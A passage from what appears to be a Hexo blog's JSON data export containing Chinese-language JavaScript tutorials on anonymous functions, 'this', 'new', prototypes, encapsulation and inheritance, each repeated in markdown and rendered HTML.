class=\"string\">\"abc\"</span>);</span><br></pre></td></tr></table></figure></p>\n<p>“=”右边的函数就是一个匿名函数，创造完毕函数后，又将该函数赋给了变量f。通过f再调用这个匿名函数。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">t</span>)</span>&#123;</span><br><span class=\"line\">\talert(t)</span><br><span class=\"line\">   &#125;)(<span class=\"string\">\"abc\"</span>);</span><br></pre></td></tr></table></figure>\n<p>这里创建了一个匿名函数(在第一个括号内)，第二个括号用于调用该匿名函数，并传入参数。<br>这就是匿名函数常用的使用方式，通常用得最多的是第二种。</p>\n<p>前端人员一般为了避免声明了一些全局变量而污染，把代码放在一个“沙箱执行”，然后在暴露出命名空间（可以为API，函数，对象）,如Jquery:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> window, undefined </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">window</span>.jQuery = <span class=\"built_in\">window</span>.$ = jQuery;</span><br><span class=\"line\">&#125;)( <span class=\"built_in\">window</span> );</span><br></pre></td></tr></table></figure>\n<p>再如我想建一个自己的框架叫yb:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">window,undefined</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> yb = &#123;</span><br><span class=\"line\">\t\tadd:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t\talert(<span class=\"string\">\"add\"</span>);</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tsub:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t\talert(<span class=\"string\">\"sub\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">window</span>.yb = yb;</span><br><span class=\"line\">&#125;)(<span class=\"built_in\">window</span>);</span><br></pre></td></tr></table></figure>\n<p>你的方法add和sub只能通过全局对象yb访问，这个是函数闭包规则决定的。如不能理解闭包请参见<a href=\"http://binyanbin.github.io/2016/01/03/javascript-base-1/\">函数的闭包</a>;</p>"},{"title":"Javascript的面向对象编程","date":"2016-02-20T16:00:00.000Z","desc":"Javascript  面向对象","_content":"Javascript里的所有东西都是对象，可是它又不并像Java,C#。不是严格意义上的OOP语言。但是它可以实现OOP的效果。但在之前你需要了解哪些关键的知识点?\n\n## 关键知识点\n\n### this\n我们看下面这个使用this的例子\n\n``` Javascript\n    var obj = {\n        name:\"yanbin\",\n        showName :function(){\n            alert(this.name);\n        }\n    };\n\n    var other ={\n        name:\"changsha\",\n        showName:obj.showName\n    };\n```\nobj.showName()提示的是yanbin,obj.showName()提示的是changsha，this是指执行时当前的对象。\n<!-- more -->\n``` Javascript\n    function test(){\n        return this;\n    }\n```\n\n执行时函数不属于任何对象时,this表示window。(使用var定义的对象也属于window)\n\n### new\n在Javascript中,new一个函数它做了以下3件事:\n* 创建新对象。\n* 拷贝prototype到新对象。\n* 设置构造函数\n* 执行函数返回给新对象。\n请看下面这个示例\n``` Javascript\n    function func(){\n        this.name = 'yanbin';\n        this.showcity =function(){\n        \talert('changsha')\n    \t}\n    }\n    var  model =new func();\n```\n通过代码还原new的步骤\n``` Javascript\nvar newobj = {};\nnewobj.__proto__ = func.prototype;\nfunc.prototype.constructor = func;\np.apply(newobj)\nvar model = newobj;\n```\n这段代码我们需要搞清楚二个属性:\n* prototype:在定义一个新函数，都会给函数创建一个prototype属性，也就是原型对象，把它看成普通对象也行了，但它可以影响这个函数实例的__protype__.\n* \\__protype\\__:是函数实例的原型对象指针，每次new一个函数的时候都会给实例生成一个指针newobj.\\__proto\\__=func.protype。当函数的原型对象改变时，那么实例也会发生改变，因为\\__proto\\__只是指针，所以它也不能修改，只能对应的原型方法或属性访问它。\n弄清楚了这些我们就可以开始OPP实践了。\n\n## 封装示例\n``` Javascript\n    function person(name,sex,s)\n    {\n        this.name =name;\n        this.sex = sex;\n\n        function sayname()\n        {\n            alert(\"my name is \"+ name +\", i'm a \"+sex);\n        }\n\n        this.say =function()\n        {\n            sayname();\n        }\n\n        var secret = s;\n        this.getsecret = function(){\n            return secret;\n        }\n        this.setsecret = function(ss){\n            secret = ss;\n        }\n    }\n    var model =new Person('yanbin','man','test');\n```\nname,sex是公开属性,sayname是一个私有方法，say是一个公共方法。secret是一个私有属性,对它的赋值和取值则是通过getsecret和setsecret这二个方法。\n\n## 继承示例\n``` Javascript\n    function Man(n)\n    {\n        this.say = function()\n        {\n            alert(\"my name is:\"+ this.realname);\n        }\n       \n        this.realname = n;\n    }\n\n    Man.prototype = {\n        realname : this.realname,\n        say : this.say\n    }\n\n    function Employee(sex)\n    {\n        var sex = sex;\n        this.getsex = function(){\n           return sex;\n        }\n    }\n    \n    Employee.prototype = new Man('yanbin');\n    var model = new Employee(\"female\");\n```\nEmployee继承man的say方法和realname属性，Emplayee有一个私有属性sex和一个getsex方法。","source":"_posts/javascript-base-3.md","raw":"---\ntitle: Javascript的面向对象编程\ndate: 2016-2-21\ndesc: Javascript  面向对象 \n---\nJavascript里的所有东西都是对象，可是它又不并像Java,C#。不是严格意义上的OOP语言。但是它可以实现OOP的效果。但在之前你需要了解哪些关键的知识点?\n\n## 关键知识点\n\n### this\n我们看下面这个使用this的例子\n\n``` Javascript\n    var obj = {\n        name:\"yanbin\",\n        showName :function(){\n            alert(this.name);\n        }\n    };\n\n    var other ={\n        name:\"changsha\",\n        showName:obj.showName\n    };\n```\nobj.showName()提示的是yanbin,obj.showName()提示的是changsha，this是指执行时当前的对象。\n<!-- more -->\n``` Javascript\n    function test(){\n        return this;\n    }\n```\n\n执行时函数不属于任何对象时,this表示window。(使用var定义的对象也属于window)\n\n### new\n在Javascript中,new一个函数它做了以下3件事:\n* 创建新对象。\n* 拷贝prototype到新对象。\n* 设置构造函数\n* 执行函数返回给新对象。\n请看下面这个示例\n``` Javascript\n    function func(){\n        this.name = 'yanbin';\n        this.showcity =function(){\n        \talert('changsha')\n    \t}\n    }\n    var  model =new func();\n```\n通过代码还原new的步骤\n``` Javascript\nvar newobj = {};\nnewobj.__proto__ = func.prototype;\nfunc.prototype.constructor = func;\np.apply(newobj)\nvar model = newobj;\n```\n这段代码我们需要搞清楚二个属性:\n* prototype:在定义一个新函数，都会给函数创建一个prototype属性，也就是原型对象，把它看成普通对象也行了，但它可以影响这个函数实例的__protype__.\n* \\__protype\\__:是函数实例的原型对象指针，每次new一个函数的时候都会给实例生成一个指针newobj.\\__proto\\__=func.protype。当函数的原型对象改变时，那么实例也会发生改变，因为\\__proto\\__只是指针，所以它也不能修改，只能对应的原型方法或属性访问它。\n弄清楚了这些我们就可以开始OPP实践了。\n\n## 封装示例\n``` Javascript\n    function person(name,sex,s)\n    {\n        this.name =name;\n        this.sex = sex;\n\n        function sayname()\n        {\n            alert(\"my name is \"+ name +\", i'm a \"+sex);\n        }\n\n        this.say =function()\n        {\n            sayname();\n        }\n\n        var secret = s;\n        this.getsecret = function(){\n            return secret;\n        }\n        this.setsecret = function(ss){\n            secret = ss;\n        }\n    }\n    var model =new Person('yanbin','man','test');\n```\nname,sex是公开属性,sayname是一个私有方法，say是一个公共方法。secret是一个私有属性,对它的赋值和取值则是通过getsecret和setsecret这二个方法。\n\n## 继承示例\n``` Javascript\n    function Man(n)\n    {\n        this.say = function()\n        {\n            alert(\"my name is:\"+ this.realname);\n        }\n       \n        this.realname = n;\n    }\n\n    Man.prototype = {\n        realname : this.realname,\n        say : this.say\n    }\n\n    function Employee(sex)\n    {\n        var sex = sex;\n        this.getsex = function(){\n           return sex;\n        }\n    }\n    \n    Employee.prototype = new Man('yanbin');\n    var model = new Employee(\"female\");\n```\nEmployee继承man的say方法和realname属性，Emplayee有一个私有属性sex和一个getsex方法。","slug":"javascript-base-3","published":1,"updated":"2016-06-25T13:15:38.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltc000lg2x6gj2fpsdo","content":"<p>Javascript里的所有东西都是对象，可是它又不并像Java,C#。不是严格意义上的OOP语言。但是它可以实现OOP的效果。但在之前你需要了解哪些关键的知识点?</p>\n<h2 id=\"关键知识点\"><a href=\"#关键知识点\" class=\"headerlink\" title=\"关键知识点\"></a>关键知识点</h2><h3 id=\"this\"><a href=\"#this\" class=\"headerlink\" title=\"this\"></a>this</h3><p>我们看下面这个使用this的例子</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    name:<span class=\"string\">\"yanbin\"</span>,</span><br><span class=\"line\">    showName :<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> other =&#123;</span><br><span class=\"line\">    name:<span class=\"string\">\"changsha\"</span>,</span><br><span class=\"line\">    showName:obj.showName</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>obj.showName()提示的是yanbin,obj.showName()提示的是changsha，this是指执行时当前的对象。<br><a id=\"more\"></a><br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>执行时函数不属于任何对象时,this表示window。(使用var定义的对象也属于window)</p>\n<h3 id=\"new\"><a href=\"#new\" class=\"headerlink\" title=\"new\"></a>new</h3><p>在Javascript中,new一个函数它做了以下3件事:</p>\n<ul>\n<li>创建新对象。</li>\n<li>拷贝prototype到新对象。</li>\n<li>设置构造函数</li>\n<li>执行函数返回给新对象。<br>请看下面这个示例<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = <span class=\"string\">'yanbin'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.showcity =<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    \talert(<span class=\"string\">'changsha'</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span>  model =<span class=\"keyword\">new</span> func();</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>通过代码还原new的步骤<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> newobj = &#123;&#125;;</span><br><span class=\"line\">newobj.__proto__ = func.prototype;</span><br><span class=\"line\">func.prototype.constructor = func;</span><br><span class=\"line\">p.apply(newobj)</span><br><span class=\"line\"><span class=\"keyword\">var</span> model = newobj;</span><br></pre></td></tr></table></figure></p>\n<p>这段代码我们需要搞清楚二个属性:</p>\n<ul>\n<li>prototype:在定义一个新函数，都会给函数创建一个prototype属性，也就是原型对象，把它看成普通对象也行了，但它可以影响这个函数实例的<strong>protype</strong>.</li>\n<li>__protype__:是函数实例的原型对象指针，每次new一个函数的时候都会给实例生成一个指针newobj.__proto__=func.protype。当函数的原型对象改变时，那么实例也会发生改变，因为__proto__只是指针，所以它也不能修改，只能对应的原型方法或属性访问它。<br>弄清楚了这些我们就可以开始OPP实践了。</li>\n</ul>\n<h2 id=\"封装示例\"><a href=\"#封装示例\" class=\"headerlink\" title=\"封装示例\"></a>封装示例</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">person</span>(<span class=\"params\">name,sex,s</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name =name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.sex = sex;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sayname</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        alert(<span class=\"string\">\"my name is \"</span>+ name +<span class=\"string\">\", i'm a \"</span>+sex);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.say =<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        sayname();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> secret = s;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getsecret = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setsecret = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">ss</span>)</span>&#123;</span><br><span class=\"line\">        secret = ss;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> model =<span class=\"keyword\">new</span> Person(<span class=\"string\">'yanbin'</span>,<span class=\"string\">'man'</span>,<span class=\"string\">'test'</span>);</span><br></pre></td></tr></table></figure>\n<p>name,sex是公开属性,sayname是一个私有方法，say是一个公共方法。secret是一个私有属性,对它的赋值和取值则是通过getsecret和setsecret这二个方法。</p>\n<h2 id=\"继承示例\"><a href=\"#继承示例\" class=\"headerlink\" title=\"继承示例\"></a>继承示例</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Man</span>(<span class=\"params\">n</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.say = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        alert(<span class=\"string\">\"my name is:\"</span>+ <span class=\"keyword\">this</span>.realname);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">this</span>.realname = n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Man.prototype = &#123;</span><br><span class=\"line\">    realname : <span class=\"keyword\">this</span>.realname,</span><br><span class=\"line\">    say : <span class=\"keyword\">this</span>.say</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Employee</span>(<span class=\"params\">sex</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> sex = sex;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getsex = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> sex;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Employee.prototype = <span class=\"keyword\">new</span> Man(<span class=\"string\">'yanbin'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> model = <span class=\"keyword\">new</span> Employee(<span class=\"string\">\"female\"</span>);</span><br></pre></td></tr></table></figure>\n<p>Employee继承man的say方法和realname属性，Emplayee有一个私有属性sex和一个getsex方法。</p>\n","excerpt":"<p>Javascript里的所有东西都是对象，可是它又不并像Java,C#。不是严格意义上的OOP语言。但是它可以实现OOP的效果。但在之前你需要了解哪些关键的知识点?</p>\n<h2 id=\"关键知识点\"><a href=\"#关键知识点\" class=\"headerlink\" title=\"关键知识点\"></a>关键知识点</h2><h3 id=\"this\"><a href=\"#this\" class=\"headerlink\" title=\"this\"></a>this</h3><p>我们看下面这个使用this的例子</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    name:<span class=\"string\">\"yanbin\"</span>,</span><br><span class=\"line\">    showName :<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> other =&#123;</span><br><span class=\"line\">    name:<span class=\"string\">\"changsha\"</span>,</span><br><span class=\"line\">    showName:obj.showName</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>obj.showName()提示的是yanbin,obj.showName()提示的是changsha，this是指执行时当前的对象。<br>","more":"<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>执行时函数不属于任何对象时,this表示window。(使用var定义的对象也属于window)</p>\n<h3 id=\"new\"><a href=\"#new\" class=\"headerlink\" title=\"new\"></a>new</h3><p>在Javascript中,new一个函数它做了以下3件事:</p>\n<ul>\n<li>创建新对象。</li>\n<li>拷贝prototype到新对象。</li>\n<li>设置构造函数</li>\n<li>执行函数返回给新对象。<br>请看下面这个示例<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = <span class=\"string\">'yanbin'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.showcity =<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    \talert(<span class=\"string\">'changsha'</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span>  model =<span class=\"keyword\">new</span> func();</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>通过代码还原new的步骤<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> newobj = &#123;&#125;;</span><br><span class=\"line\">newobj.__proto__ = func.prototype;</span><br><span class=\"line\">func.prototype.constructor = func;</span><br><span class=\"line\">p.apply(newobj)</span><br><span class=\"line\"><span class=\"keyword\">var</span> model = newobj;</span><br></pre></td></tr></table></figure></p>\n<p>这段代码我们需要搞清楚二个属性:</p>\n<ul>\n<li>prototype:在定义一个新函数，都会给函数创建一个prototype属性，也就是原型对象，把它看成普通对象也行了，但它可以影响这个函数实例的<strong>protype</strong>.</li>\n<li>__protype__:是函数实例的原型对象指针，每次new一个函数的时候都会给实例生成一个指针newobj.__proto__=func.protype。当函数的原型对象改变时，那么实例也会发生改变，因为__proto__只是指针，所以它也不能修改，只能对应的原型方法或属性访问它。<br>弄清楚了这些我们就可以开始OPP实践了。</li>\n</ul>\n<h2 id=\"封装示例\"><a href=\"#封装示例\" class=\"headerlink\" title=\"封装示例\"></a>封装示例</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">person</span>(<span class=\"params\">name,sex,s</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name =name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.sex = sex;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sayname</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        alert(<span class=\"string\">\"my name is \"</span>+ name +<span class=\"string\">\", i'm a \"</span>+sex);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.say =<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        sayname();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> secret = s;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getsecret = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setsecret = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">ss</span>)</span>&#123;</span><br><span class=\"line\">        secret = ss;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> model =<span class=\"keyword\">new</span> Person(<span class=\"string\">'yanbin'</span>,<span class=\"string\">'man'</span>,<span class=\"string\">'test'</span>);</span><br></pre></td></tr></table></figure>\n<p>name,sex是公开属性,sayname是一个私有方法，say是一个公共方法。secret是一个私有属性,对它的赋值和取值则是通过getsecret和setsecret这二个方法。</p>\n<h2 id=\"继承示例\"><a href=\"#继承示例\" class=\"headerlink\" title=\"继承示例\"></a>继承示例</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Man</span>(<span class=\"params\">n</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.say = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        alert(<span class=\"string\">\"my name is:\"</span>+ <span class=\"keyword\">this</span>.realname);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">this</span>.realname = n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Man.prototype = &#123;</span><br><span class=\"line\">    realname : <span class=\"keyword\">this</span>.realname,</span><br><span class=\"line\">    say : <span class=\"keyword\">this</span>.say</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Employee</span>(<span class=\"params\">sex</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> sex = sex;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getsex = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> sex;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Employee.prototype = <span class=\"keyword\">new</span> Man(<span class=\"string\">'yanbin'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> model = <span class=\"keyword\">new</span> Employee(<span class=\"string\">\"female\"</span>);</span><br></pre></td></tr></table></figure>\n<p>Employee继承man的say方法和realname属性，Emplayee有一个私有属性sex和一个getsex方法。</p>"},{"title":"Javascript的闭包","date":"2016-01-02T16:00:00.000Z","desc":"Javascript  闭包","_content":"闭包是Javascript的一个重点的概念，在开发过程中用得非常多，但是在了解闭包之前我们需要了解全局与局部的概念，下面来看这个例子。\n<!-- more -->\n``` Javascript\n\tvar global = 1;\n    function myfun()\n    {\n    \tvar my = 1;\n\t\tfunction infun()\n\t\t{\n\t\t\tvar in = 2;\n\t\t\tfunction 